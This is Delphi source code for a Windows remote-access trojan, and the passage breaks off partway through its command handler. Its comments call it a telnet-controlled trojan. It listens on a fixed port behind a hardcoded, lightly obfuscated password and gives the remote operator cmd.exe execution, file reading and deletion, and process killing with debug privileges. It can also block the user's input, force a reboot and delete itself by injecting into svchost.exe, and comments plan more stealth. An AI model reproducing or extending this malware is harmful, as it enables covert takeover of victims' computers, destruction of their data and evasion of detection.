Program Sck_serv;
{$I-}
// Простейший троян, управляемый ч/з тельнет
// Работает по протоколу login
// Created by Artiom N.(c)2005

{ 1. Скрытия нет (в будущем, если стану развивать, будет перехват API функций).
      Инъекция, например, в explorer.exe.
  2. Надо добавить файловые команды (в частности поиск).
  3. Можно написать клиента.
}
//{$APPTYPE CONSOLE}
uses
  SysFuncs, // in '../ShareUnits/SysFuncs.pas',
  CrtSock,
  Windows,
  TLHelp32,
  advAPIHook;
resourcestring
      // Пароль - трёхзначные десятичные ASCII коды символов, входящих в него
      // Знаю, что мечта параноика SHA-384, использование SSH и т.д.
      // Но кто будет снифить трафик трояна?
      // А от strings Защитит простейшее "шифрование" и Морфин.
      //Логин
      TrojLogin = 'artiom';
      TrojPasw  = '049045116117112105101045052'; //1-tupie-4
      // Порт
      l_port    = '5577';
      Comspec   = 'c:\windows\system32\cmd.exe /c';
const LN_FEED = #13#10;          // Перевод строки
      CR = #13;                  // Enter или <CR>
      RestartTimeWait = 3000;    // Ждать перед стартом на рестарте
      Bs = 512;                  // Размер блока при копировании
      //------------------------------------------------------------
      Ver = 'ESS (Extended Socket Server) v.0.1b by Artiom N.(c)2005';
      Str_Hello = 'HELLO from ' + Ver + #13#10; // Строка приветствия
      Str_Psw = 'Enter the password: ';         // Приглашение к вводу пароля
      Str_Login = 'Enter login: ';              // Приглашение к вводу логина
      Disc_String = 'Disconnecting...';
      PS1 = '>';  // Главное приглашение
      PS2 = ':';  // Приглашение в ответах на вопросы и т.д.
      MaxLn = 50; // Форматная длина (исп-ся при выводе на экран в ровный стлобец
      MaxCmdLen = 255;     // Макс. длина, принимаемой строки
      EchoStyle = false;   // false - эхо выключено
      // Имя программы для функции DeleteSelf
      InjectionForDelete = 'svchost.exe';

Var Srv, Cln: integer;
    Tf: Text;              // Файл ввода-вывода, ассоциированный с терминалом
    TrmCmd: String;        // Строка-команда
    // Флаг включения отображения символов
    EchoOn: Boolean = EchoStyle;
    // Сообщения об ошибках
    ErrArray: Array[0..15] Of String =
    (
      'Operation completed successfully...',
      'Filename is empty!',
      'Directory name is empty!',
      'Parameters error!',
      'Disk letter incorrect!',
      'Login fault!',
      'Reboot error!',
      'Internal command not found!',
      'Error while killing process!',
      'Error!',
      'Error while creating directory!',
      'Error while deleting file!',
      'Error while renaming file!',
      'Copying error!','',''
    );
    CurLogin : String;

Procedure ClnStop(SrvSck, ClnSck: Integer);
Begin
   AssignCrtSock(Srv, Input, Output);
   Disconnect(Cln);
End;

Function Check_Avail: Boolean;
 Var
  SockSet:Packed Record
   count:integer;
   Socks:{array[0..63] of} integer;
  End;
  Timeval:TTimeOut;
Begin
{  SockSet.count:=1;
  SockSet.socks:=Cln;
  Timeval.sec:=0;
  Timeval.usec:=SockWait;
  Result:=Select(0,@sockSet,nil,nil,timeval) > 0;
  If (Not Result) Then ClnStop(Srv, Cln);}
  Result:=True;
  if (SockAvail(Cln) < 0) Then
     Begin
        // Сам клиент порвался
        ClnStop(Srv, Cln);
        Result:=False;
     End;
End;

Function RecodeToOEM(const S: String): String;
Var NewS: String;
Begin
   if (Length(S) = 0) Then exit;
   SetLength(NewS, Length(S));
   AnsiToOEM(PChar(S), PChar(NewS));
   Result := NewS;
End;

Function RecodeToANSI(const S: String): String;
Var NewS: String;
Begin
   if (Length(S) = 0) Then exit;
   SetLength(NewS, Length(S));
   OEMToAnsi(PChar(S), PChar(NewS));
   Result := NewS;
End;


Procedure WriteLf(S: String; Recode: Boolean = true); overload;
Begin
   if (Recode) Then S := RecodeToOEM(S);
   Write(S + LN_FEED);
End;

Procedure WriteLf(const S: Int64); overload;
Begin
   Write(S, LN_FEED);
End;

Function ShErr: Boolean;
// Вывод ошибки операционной системы
Var Err: Integer;
Begin
   Err:=IOResult;
   Result:=False;
   If Err <> 0 Then
      Begin
         Result:=True;
         WriteLf(SysErrorMessage(Err));
      End;
End;

Function GetRealPasw(const Psw: String): String;
// Дешифрует пароль 
Var LPos, Pl: Integer;

Begin
   Result:='';
   Pl:=Length(Psw);
   LPos:=1;
   While (LPos < Pl)
      Do
         Begin
            Result:=Result + Chr(StrToIntDef(Copy(Psw, LPos, 3), 0));
            LPos:=LPos + 3;
         End;
End;

Var FileName: array[0..255] of char;
Procedure FileDelete;
Begin
   DeleteFile(FileName);
   ExitProcess(0);
End;

procedure DeleteSelf;
// Самоудаление
var
 St: TStartupInfo;
 Pr: TProcessInformation;

Begin
   GetModuleFileName(GetModuleHandle(nil), FileName, 255);
   if (not CreateProcess(nil, InjectionForDelete, nil, nil, false,
       CREATE_SUSPENDED, nil, nil, St, Pr)) Then Halt(1);

   InjectThisExe(Pr.hProcess, @FileDelete);
   ExitThread(0);
end;

procedure ExecConsoleApp(const CommandLine: AnsiString);
// Запуск консольной программы с перенаправлением вывода в пайп
Var
  sa: TSECURITYATTRIBUTES;
  si: TSTARTUPINFO;
  pi: TPROCESSINFORMATION;
  hPipeOutputRead: THANDLE;
  hPipeOutputWrite: THANDLE;
  hPipeErrorsRead: THANDLE;
  hPipeErrorsWrite: THANDLE;
  Res, bTest: Boolean;
  env: Array[0..100] of Char;
  szBuffer: Array[0..256] of Char;
  dwNumberOfBytesRead: DWORD;

Begin
  sa.nLength := sizeof(sa);
  sa.bInheritHandle := true;
  sa.lpSecurityDescriptor := nil;
  CreatePipe(hPipeOutputRead, hPipeOutputWrite, @sa, 0);
  CreatePipe(hPipeErrorsRead, hPipeErrorsWrite, @sa, 0);
  ZeroMemory(@env, SizeOf(env));
  ZeroMemory(@si, SizeOf(si));
  ZeroMemory(@pi, SizeOf(pi));
  si.cb := SizeOf(si);
  si.dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
  si.wShowWindow := SW_HIDE;
  si.hStdInput:=0;
  si.hStdOutput:=hPipeOutputWrite;
  si.hStdError:=hPipeErrorsWrite;

  Res:=CreateProcess(nil, pchar(CommandLine), nil, nil, true,
    CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, @env, nil, si, pi);

  // Procedure will exit if CreateProcess fail
  If Not Res Then
  Begin
    CloseHandle(hPipeOutputRead);
    CloseHandle(hPipeOutputWrite);
    CloseHandle(hPipeErrorsRead);
    CloseHandle(hPipeErrorsWrite);
    Exit;
  End;
  CloseHandle(hPipeOutputWrite);
  CloseHandle(hPipeErrorsWrite);

  // Read output pipe
   While true Do
      Begin
         FillChar(szBuffer, SizeOf(szBuffer), 0);
         bTest:=ReadFile(hPipeOutputRead, szBuffer, 256, dwNumberOfBytesRead,
                  nil);
         If Not bTest Then break;
         // Грёбаный M$ живёт в OEM консольной жизнью
         // OEMToANSI(szBuffer, szBuffer);
         WriteLf(szBuffer, false);
      End;

  // Read error pipe
   While true Do
      Begin
         FillChar(szBuffer, SizeOf(szBuffer), 0);
         bTest:=ReadFile(hPipeErrorsRead, szBuffer, 256, dwNumberOfBytesRead, nil);
         If Not bTest Then Break;
         // OEMToANSI(szBuffer, szBuffer);
         WriteLf(szBuffer, false);
      End;
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(hPipeOutputRead);
  CloseHandle(hPipeErrorsRead);
End;

Procedure ShowBack;
// Перевод каретки назад, печать пробела, перевод назад
Begin
   if (EchoOn) Then Write(#08' '#08);
End;

Function Echo: String;
// Получение строки с эхоотображением
Var Msg: String;
    TmpChar: Char;
    MsgLen: Integer;

Begin
   Result := '';
   SetLength(Msg, 0);
   repeat
      if (not Check_Avail) Then break;
      MsgLen := Recv(Cln, @TmpChar, 1, 0);
      if ((TmpChar = CR) or (Length(Msg) >= MaxCmdLen)) Then
      // Enter
      Begin
         Recv(Cln, @TmpChar, 1, 0); // Читаю LF
         if (EchoOn) Then Write(LN_FEED);
         Msg      := RecodeToANSI(Msg);
         Result   := Msg;
         Exit;
      End
      Else if ((TmpChar = #08) or (TmpChar = #127)) Then
      // BackSpace
         Begin
            If (Length(Msg) > 0) Then
               Begin
                  SetLength(Msg, Length(Msg) - 1);
                  ShowBack;
               End;
         End
      Else
      // Обычный символ
         Begin
            if (EchoOn) Then Write(TmpChar);
            Msg := Msg + TmpChar;
         End;
   until (MsgLen <= 0);

End;

Function ReadCmd: String;
// Читает коммандную строку
Begin
   Result := Echo;
End;

Function ReadLogin: String;
Begin
   Result := Echo;
End;

Function ReadPasw: String;
// Читает пароль (отображение звёздочек)
Var Psw: String;
    TmpChar: Char;
    PswLen: Integer;

Begin
   Result := '';
   SetLength(Psw, 0);
   repeat
      if (not Check_Avail) Then break;
      PswLen := Recv(Cln, @TmpChar, 1, 0);
      if ((TmpChar = CR) or (Length(Psw) >= MaxCmdLen)) Then
      // Enter
      Begin
         TmpChar  := #0;
         Result   := Psw;
         Psw      := '          ';
         Recv(Cln, @TmpChar, 1, 0); // Читаю LF         
         if (EchoOn) Then Write(LN_FEED);
         Exit;
      End
      Else If (TmpChar = #08) Then
      // BackSpace
         Begin
            If (Length(Psw) > 0) Then
               Begin
                  SetLength(Psw, Length(Psw) - 1);
                  ShowBack;
               End;
         End
      Else
      // Обычный символ
         Begin
            Psw := Psw + TmpChar;
            if (EchoOn) Then Write('*')
            Else
            // Эхо выключено, но всё равно выводим звёздочки, предполагая,
            // что терминал отображает введённые символы
               Begin
                  EchoOn := true;
                  ShowBack;
                  Write('*');
                  EchoOn := false;
               End;
         End;
   until (PswLen <= 0);
End;

Procedure Usage;
// Выводит краткую справку
Begin
   WriteLf(' Internal server commands (starting with "\"): ' + LN_FEED +
   ' --- Main ---' + LN_FEED +
   '   h|?|help - This help' + LN_FEED +
   '   q|quit|exit|x|bye - Disconnect' + LN_FEED +
   '   r - Restart server' + LN_FEED +
   '   s - Shutdown server' + LN_FEED +
   '   v|V - Version' + LN_FEED +
   ' --- Directory commands ---' + LN_FEED +
   '   pwd - Show current directory' + LN_FEED +
   '   cd <dir> - Change directory' + LN_FEED +
   '   ls [dir] - Show directory content' + LN_FEED +
   '   mkdir <dir> - Make new directory' + LN_FEED +
   '   rmdir <dir> - Remove empty directory' + LN_FEED +
   '   rmr <dir> - Recursively remove directory' + LN_FEED +
   ' --- File commands ---' + LN_FEED +
   '   cp <file1><\ ><file2> - Copy file1 to file2' + LN_FEED +
   '   mv <file1><\ ><file2> - Rename file1 to file2' + LN_FEED +
   '   rm <file> - Delete file' + LN_FEED +
   '   cat <file> - Print file on the terminal' + LN_FEED +
   ' --- Find commands ---' + LN_FEED +
   '   findm <file><\ ><mask> - Find file, based on mask' + LN_FEED +
   '   finds <file><\ ><size> - Find File, creater or equal size' + LN_FEED +
   ' --- Disk commands ---' + LN_FEED +
   '   du <dir/file> - File or directory size' + LN_FEED +
   '   ds <Disk> - Disk statistics' + LN_FEED +
   ' --- Process control commands ---' + LN_FEED +
   '   ps - Show process list' + LN_FEED +
   '   kill <PID> - Terminate process with PID' + LN_FEED +
   ' --- Commands running ---' + LN_FEED +
   '   cmd [command] - Do command with cmd.exe' + LN_FEED +
   '   run <command> - Run command with ShellExecute' + LN_FEED +
   ' --- Other commands ---' + LN_FEED +
   '   bi - Block input (keyboard and mouse)' + LN_FEED +
   '   ubi - Unblock input' + LN_FEED +
   '   msg <message> - Show message' + LN_FEED +
   '   print <file> - Print file via printer' + LN_FEED +
   '   reboot - Reboot OS' + LN_FEED +
   '   delserver - Selfdeleting' + LN_FEED + 
   ' END'
   );
End;

Procedure DiskStat(DChar: Char);
// Статистика по диску (объём, занято, свободно)
Var DSz, DfSz, DuSz: Int64;
    DskStr: String;

Begin
   If DChar = #0 Then DChar:=#64; //(64 - 64 = 0)
   DChar:=UpCase(DChar);
   If (DChar < #64) Or (DChar > #90) Then
      Begin
         WriteLf(ErrArray[4]);
         Exit;
      End;
   DfSz  := DiskFree(Ord(DChar) - 64);
   DSz   := DiskSize(Ord(DChar) - 64);
   DuSz  :=DSz - DfSz;
   DfSz  :=Trunc(DfSz/1024);
   DuSz  :=Trunc(DuSz/1024);
   DSz   :=Trunc(DSz/1024);
   GetDir(0, DskStr);
   If (DChar = #64) Then DChar:=DskStr[1]; //Буква текущего диска
   DskStr:='Drive ' + DChar + ' statistics: ' + LN_FEED + ' Size: '
             + IntToStr(DSz) + ' K (' + IntToStr(DSz div 1024) + '.' +
             IntToStr(DSz mod 1024) + ' M)' + LN_FEED
             + ' Free: ' + IntToStr(DfSz) + ' K (' +
             IntToStr(DfSz div 1024) + '.' + IntToStr(DfSz mod 1024) + ' M)'
             + LN_FEED + ' Usage: ' + IntToStr(DuSz) + ' K ('
             + IntToStr(DuSz div 1024) + '.' + IntToStr(DuSz mod 1024) + ' M)';
   WriteLf(DskStr);
End;

Function Pwd: String;
// Выводит текущий каталог
Var CDir: String;
Begin
   GetDir(0,CDir);
   Result:=CDir;
   WriteLf(CDir);
   ShErr;
End;

Procedure Ls(Dir: String);
// Выводит оглавление каталога
Var Sr: TSearchRec;
    DName: String;
    I: Integer;

Begin
   // Каталог не задан - все файлы в текущем
   If Dir = '' Then Dir := Pwd + '\*.*';
   // Каталог оканчивается на \ - все файлы в нём
   If LastDelimiter('\', Dir) = Length(Dir) Then Dir:=Dir + '*.*';
   If FindFirst(Dir, faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
   //      Sr.Time
         // Показ аттрибутов в *nix стиле
         DName:='';
         If (Sr.Attr And faDirectory <> 0) Then DName:=DName + 'd'
         Else DName:=DName + '-';
         If (Sr.Attr And faReadOnly <> 0) Then DName:=DName + 'r'
         Else DName:=DName + '-';
         If (Sr.Attr And faHidden <> 0) Then DName:=DName + 'h'
         Else DName:=DName + '-';
         If (Sr.Attr And faSysFile <> 0) Then DName:=DName + 's'
         Else DName:=DName + '-';
         If (Sr.Attr And faArchive <> 0) Then DName:=DName + 'a'
         Else DName:=DName + '-';
         If (Sr.Attr And faSymLink <> 0) Then DName:=DName + 'l'
         Else DName:=DName + '-';
         DName:=DName + ' ' + Sr.Name;
         FileDateToDateTime(Sr.Time);

         // Извращаюсь :-)
         If (Length(DName) < MaxLn) Then
         For I:=1 To MaxLn - Length(DName)
            Do
               DName:=DName + ' '
         Else DName:=DName + ' ';
         If (Sr.Attr And faDirectory = 0) Then DName:=DName + IntToStr(Sr.Size);
         WriteLf(DName);
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
End;

Function MatchFunct(Name: String; Mask: String): Boolean; overload;
// Тут могут быть ошибки
// Проверяет подходит ли строка под маску
Var NPos, MPos, Nl, Ml: Integer;

Begin
   // Оно не *nix, регистр не различает
   Name := StrUpper(PChar(Name));
   Mask:=StrUpper(PChar(Mask));
   Result:=False;
   NPos:=1;
   MPos:=1;
   Nl:=Length(Name);
   Ml:=Length(Mask);
   While ((NPos <= Nl) And (MPos <= Ml)) Do
   Case Mask[MPos] Of
      '*':
         Begin
            If (MPos >= Ml) Then
               Begin
                  // Маска закончилась, * - последий символ маски
                  Result:=True;
                  Exit;
               End
            Else
            If ((Mask[MPos + 1] = '?') And (NPos + 1 <= Nl)) Then
               Begin
                  // Знак вопроса после * в маске - любой следующий символ в имени
                  MPos:=MPos + 1;
                  NPos:=NPos + 1;
               End
            Else
            // Комбинации ** быть не может (надо их сворачивать)
            If (Pos(Mask[MPos + 1], Name) >= NPos) Then
               Begin
                  MPos:=MPos + 1;
                  NPos:=Pos(Mask[MPos], Name);
               End
            Else Exit;
         End;
      '?':
         Begin
            NPos:=NPos + 1;
            MPos:=MPos + 1;
            // Строка имени закончилась, но в в маске ещё один любой символ
            If (NPos > Nl) Then Exit;
         End;
      Else
         Begin
         // Другие символы маски не соответствуют символам в имени
            If (Name[NPos] <> Mask[MPos]) Then Exit;
            NPos:=NPos + 1;
            MPos:=MPos + 1;
         End;
   End;
   If (MPos < Ml) Then Exit;
   Result:=True;
End;

Function MatchFunct(Sz, MaxSz: LongInt): Boolean; overload;
Begin
   If (Sz >= MaxSz) Then Result:=True
   Else Result:=False;
End;

Procedure FindFile(DName, FName: String); overload;
// Ищет файл по маске, начиная с указанного каталога
Var
  Sr: TSearchRec;
Begin
   DName:=IncludeTrailingPathDelimiter(DName);
   If FindFirst(DName + '*.*', faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         If (MatchFunct(Sr.Name, FName)) Then WriteLf(DName + Sr.Name);
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               FindFile(DName + Sr.Name, FName);
               Continue;
            End;
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
End;

Procedure FindFile(DName: String; Sz: Integer); overload;
// Ищет файл больше или равный указанному размеру
// Если установлен аттрибут "скрытый" - показывает
Var
  Sr: TSearchRec;
Begin
   DName:=IncludeTrailingPathDelimiter(DName);
   If FindFirst(DName + '*.*', faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         Sr.Size:=Round(Sr.Size/1024);
         If (MatchFunct(Sr.Size, Sz)) Then
         Begin
            If (Sr.Attr And faHidden <> 0) Then Write('-H- ');
            WriteLf(DName + Sr.Name + ' ' + IntToStr(Sr.Size) + ' K');
         End;
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               FindFile(DName + Sr.Name, Sz);
               Continue;
            End;
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
End;

Function Rm(const FName: String): Boolean;
// Удаляет файл
Begin
   If Not DeleteFile(PChar(FName)) Then
      Begin
         WriteLf(ErrArray[11]);
         Result:=False;
      End;
   Result:=True;
End;

Procedure Rmr(Nm: String);
// Удаляет КАТАЛОГ рекурсивно
Var
  Sr: TSearchRec;
Begin
   Nm:=IncludeTrailingPathDelimiter(Nm);
   If FindFirst(Nm + '*.*', faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               Rmr(Nm + Sr.Name);
               Continue;
            End;
         Rm(Nm + Sr.Name);
      Until FindNext(Sr) <> 0;
   Finally
      Sysfuncs.FindClose(Sr);
   End;
   RmDir(Nm); // Удаляю уже пустой Nm
End;

Procedure Mv(const Nm1, Nm2: String);
// Переименовыает файл или каталог
Begin
   // Если есть файл с таким именем - удаляю
   If FileExists(Nm2) Then
      If Not Rm(Nm2) Then Exit;
   If Not MoveFile(PChar(Nm1), PChar(Nm2)) Then
      WriteLf(ErrArray[12]);
End;

Function FileSz(const FName: String): Integer;
// Считает размер файла
Var fl: File of Byte;
    LastMode: Integer;
Begin
   Result:=-1;
   AssignFile(Fl, FName);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl);
   FileMode:=LastMode;
   If ShErr Then Exit;
   Result:=FileSize(fl);
   CloseFile(fl);
End;

Function Du(const Nm: String): Int64;
// Выводит размер файла или каталога
   Procedure GetDirSize(Const aPath: String; Var SizeDir: Int64);
   // Вкратце: Процедура не моя. Вычисляет размер каталога.
   // Проходит рекурсивно по каталогам.
   // Добавляет к переменной SizeDir новое значение.
   Var
     SR: TSearchRec;
     tPath: string;
   Begin
     tPath := IncludeTrailingPathDelimiter(aPath);
     If FindFirst(tPath + '*.*', faAnyFile, SR) = 0 then
        Begin
          Try
            Repeat
              If (SR.Name = '.') or (SR.Name = '..') Then Continue;
              If (SR.Attr and faDirectory) <> 0 Then
                 Begin
                   GetDirSize(tPath + SR.Name, SizeDir);
                   Continue;
                 End;
              SizeDir := SizeDir +
              (SR.FindData.nFileSizeHigh shl 32) +
              SR.FindData.nFileSizeLow;
            Until FindNext(SR) <> 0;
          Finally
        SysFuncs.FindClose(SR);
        End;
     End;
   End;

Var DSz: Int64;
Begin
   Result:=-1;
   DSz:=0;
   // Если каталог, юзаю GetDirSize, иначе FileSz
   If DirectoryExists(Nm) Then GetDirSize(Nm, DSz)
   Else DSz:=FileSz(Nm);
   Result:=DSz;
End;

Procedure Cp(const Nm1, Nm2: String);
// Копирует файл
Var fl1, fl2: File;
    fBuf: Array[1..Bs] Of Byte;
    Bytes, BytesW, LastMode: Integer;
Begin
   AssignFile(fl1, Nm1);
   AssignFile(fl2, Nm2);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl1, 1);
   If ShErr Then Exit;
   FileMode:=LastMode;
   ReWrite(fl2, 1);
   If ShErr Then
      Begin
         CloseFile(fl1);
         Exit;
      End;
   Repeat
      BlockRead(fl1, fBuf, SizeOf(fBuf), Bytes);
      If ShErr Then
         Begin
            CloseFile(fl1);
            CloseFile(fl2);
            Exit;
         End;
      BlockWrite(fl2, fBuf, Bytes, BytesW);
      If ShErr Then
         Begin
            CloseFile(fl1);
            CloseFile(fl2);
            Exit;
         End;
   Until (Bytes = 0) Or (BytesW <> Bytes);
   CloseFile(fl1);
   CloseFile(fl2);
   If (BytesW <> Bytes) Then WriteLf(ErrArray[13]);
End;

Procedure Cat(const FName: String);
// Выводит содержимое файла (она не объединяет файлы, работает только с одним) 
Var fl1: Text;
    fBuf: String;
    LastMode: Integer;
Begin
   AssignFile(fl1, FName);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl1);
   If ShErr Then Exit;
   FileMode:=LastMode;
   If ShErr Then
      Begin
         CloseFile(fl1);
         Exit;
      End;
   While Not EOF(fl1)
      Do
         Begin
            ReadLn(fl1, fBuf);
            If ShErr Then
               Begin
                  CloseFile(fl1);
                  Exit;
               End;
            WriteLf(fBuf);
         End;
   CloseFile(fl1);
End;

// Блокирует/разблокирует ввод (мышь и клавиатуру)
Procedure BlockInput(ABlockInput: Boolean); stdcall; external 'USER32.DLL';

Procedure Ps;
// Выводит список процессов
Var
   aSnapshotHandle: THandle;
   aProcessEntry32: TProcessEntry32;
   I: Integer;
   bContinue: BOOL;
   PName: String;

Begin
   aSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPALL	, 0);
   aProcessEntry32.dwSize:=SizeOf(aProcessEntry32);
   {Заголовок списка}
   PName:='     Executable name';
   For I:=1 To Round(MaxLn/2) Do
      PName:=PName + ' ';
   PName:=PName + 'PID/Parent PID';
   WriteLf(PName);
   {Сам список процессов}
   bContinue:=Process32First(aSnapshotHandle, aProcessEntry32);
   While Integer(bContinue) <> 0
      Do
         Begin
            PName:=ExtractFileName(aProcessEntry32.szExeFile) + ' ';
            If (Length(PName) < MaxLn) Then
            For I:=1 To MaxLn - Length(PName)
               Do
                  PName:=PName + '-'
            Else PName:=PName + '-';
            PName:=PName + ' ' + IntToStr(aProcessEntry32.th32ProcessID) + '<-'
            + IntToStr(aProcessEntry32.th32ParentProcessID);
            WriteLf(PName);
            bContinue:=Process32Next(aSnapshotHandle, aProcessEntry32);
         End;
   CloseHandle(aSnapshotHandle);
   {Кстати, ProcessExplorer извлекает полный путь к EXE
    Наверняка он читает память процесса и ищет его там
    Надо посмотреть исходники и добавить такое в троян}
End;

Function Kill(const dwPID: Cardinal): Boolean;
// Завершает процесс
Var
 hToken: THandle;
 SeDebugNameValue: Int64;
 tkp: TOKEN_PRIVILEGES;
 ReturnLength: Cardinal;
 hProcess: THandle;
Begin
   Result:=False;
    // Добавляем привилегию SeDebugPrivilege
    // Для начала получаем токен нашего процесса
   If Not OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES Or
      TOKEN_QUERY, hToken) Then Exit;

    // Получаем LUID привилегии
   If Not LookupPrivilegeValue(nil, 'SeDebugPrivilege', SeDebugNameValue) Then
      Begin
         CloseHandle(hToken);
         Exit;
      End;

   Tkp.PrivilegeCount:= 1;
   Tkp.Privileges[0].Luid := SeDebugNameValue;
   Tkp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;

   // Добавляем привилегию к нашему процессу
   AdjustTokenPrivileges(hToken, False, Tkp, SizeOf(Tkp), Tkp, ReturnLength);
   If GetLastError()<> ERROR_SUCCESS  Then Exit;

   // Завершаем процесс. Если у нас есть SeDebugPrivilege, то мы можем
   // завершить и системный процесс
   // Получаем дескриптор процесса для его завершения
   hProcess:=OpenProcess(PROCESS_TERMINATE, FALSE, dwPID);
   If (hProcess = 0) Then Exit;
   // Завершаем процесс
   If Not TerminateProcess(hProcess, DWORD(-1)) Then Exit;
   CloseHandle(hProcess);

   // Удаляем привилегию
   Tkp.Privileges[0].Attributes:=0;
   AdjustTokenPrivileges(hToken, FALSE, Tkp, SizeOf(tkp), tkp, ReturnLength);
   If (GetLastError<>ERROR_SUCCESS) Then Exit;

   Result:=True;
End;

Function WinReboot: Boolean;
// Перезагружает Windows
var
  hToken: THandle;
  tkp: _TOKEN_PRIVILEGES;
  DUMMY: PTokenPrivileges;
  DummyRL: Cardinal;

Begin
  Result:=False;
  DUMMY:=nil;
  If (Not OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES Or
      TOKEN_QUERY, hToken)) Then Exit;

  If (Not LookupPrivilegeValue(nil, 'SeShutdownPrivilege',
      tkp.Privileges[0].Luid)) Then Exit;

  tkp.PrivilegeCount := 1;
  tkp.Privileges[0].Attributes := $0002; //SE_PRIVILEGE_ENABLED = $00002

  AdjustTokenPrivileges(hToken, FALSE, tkp, 0, Dummy, DummyRL);

  If (GetLastError <> ERROR_SUCCESS) Then Exit;

  If (Not ExitWindowsEx(EWX_REBOOT Or EWX_FORCE, 0)) Then Exit;
  Result:=True; // Об этом я, скорее всего, не узнаю
End;

Procedure SExec(const CStr, ToDo: String);
// Выполняет Shell команду
Var Err: Integer;
Begin
   // ToDo: open - открыть объект (файл, папку и т.д.)
   // explore - Запустить Explorer с указанным параметром (я не использую)
   // print - Печать файла
   Err:=ShellExecute(0, PChar(ToDo), PChar(CStr), nil, nil, SW_SHOWNORMAL);
   WriteLf(SysErrorMessage(Err));
End;

Procedure MsgAlert(Text: String);
// Выводит сообщение
Var Caption: String;
Begin
   Caption:='Access violation';
   if (Length(Text) = 0) Then Text := Caption;
   MessageBox(FindWindow(nil, 'FolderView'), PChar(Text), PChar(Caption),
                     MB_ICONERROR + MB_SYSTEMMODAL + MB_OKCANCEL);
         // Гы, сообщение от Рабочего стола ;-)
End;

Procedure Do_cmd(Cmd: String);
// Выполняет полученную команду
Var Sz: Int64;
   Procedure Do_int_cmd;
   Var Param1, Param2: String;

      Function GetParams: Boolean;
         Var BSPos: Integer;
            Begin
               BSPos:=Pos('\ ', Cmd);
               Param1:=Copy(Cmd, 1, BSPos - 1);
               Param2:=Copy(Cmd, BSPos + 2, Length(Cmd));
               If ((Param1 = '') Or (Param2 = '')) Then
                  Begin
                     Result:=False;
                     WriteLf(ErrArray[3]);
                     Exit;
                  End;
               Result:=True;
            End;
         Function CheckCmd(l_Cmd: String; ErrNum: Byte): Boolean;
         Begin
            If (Cmd = '') Then
               Begin
                  Result:=False;
                  WriteLf(ErrArray[ErrNum]);
               End
            Else Result:=True;
         End;

      Begin
         If (Cmd = '\q') Or (Cmd = '\quit')
            Or (Cmd = '\exit') Or (Cmd = '\bye') Or (Cmd = '\x') Then
            Begin
               WriteLf(Disc_String);
               ClnStop(Srv,Cln);
            End
         Else
         If ((Cmd = '\v') Or (Cmd = '\V')) Then
            Begin
               WriteLf(Ver);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\cd') Then
            Begin
               ChDir(Copy(Cmd, 5, Length(Cmd) - 4));
               ShErr;
            End
         Else
         If (Cmd = '\pwd') Then
            Begin
               Pwd;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\ls') Then
            Begin
               ls(Copy(Cmd, 5, Length(Cmd) - 4));
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\findm') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If GetParams Then FindFile(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\finds') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If GetParams Then FindFile(Param1, StrToIntDef(Param2, 0));
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\mkdir') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd));
               If (CheckCmd(Cmd, 2)) Then
                  Begin
                     If (Not Forcedirectories(Cmd))
                     Then WriteLf(ErrArray[10]);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\rmdir') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If CheckCmd(Cmd, 2) Then
                  Begin
                     RmDir(Cmd);
                     ShErr;
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\cat') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd));
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Cat(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\cp') Then
            Begin
               Cmd:=Copy(Cmd, 5, Length(Cmd));
               If GetParams Then Cp(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\du') Then
            Begin
               Cmd:=Copy(Cmd, 5, Length(Cmd));
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Sz:=Du(Cmd);
                     If (Sz <> -1) Then
                        Begin
                           Write(Sz);
                           WriteLf(' Blocks');
                           Write(Trunc(Sz/1000));
                           WriteLf(' KB');
                        End
                     Else WriteLf(ErrArray[9]);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\mv') Then
            Begin
               // Переименование/перемещение
               Cmd := Copy(Cmd, 5, Length(Cmd));
               If GetParams Then Mv(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\rm') Then
            Begin
               // Без точки в конце не работает... :-?
